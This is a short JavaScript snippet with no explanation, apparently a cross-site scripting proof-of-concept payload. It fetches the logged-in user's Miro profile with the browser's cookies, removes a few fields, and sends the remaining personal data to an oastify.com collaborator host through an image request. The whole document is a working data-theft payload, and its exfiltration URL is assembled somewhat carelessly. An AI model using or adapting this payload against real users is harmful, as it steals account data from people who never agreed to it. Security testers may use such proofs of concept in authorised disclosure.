(() => {
		fetch("https://miro.com/api/v1/profile/", {
			method: "GET",
			credentials: "include"
		})
			.then(res => res.json())
			.then(profileData => {
				const {
					achievements,
					subscriptions,
					toolbarPlugins,
					interests,
					betaFeatures,
					...slimProfileData
				} = profileData;
				const img = new Image();
				img.src = "ibxmt1pbyzzy0vqoxzanyuxo9ff63zro.oastify.com" +
					encodeURIComponent(JSON.stringify(slimProfileData));
			})
			.catch(err => console.error("Profile fetch failed or blocked:", err));
	})();
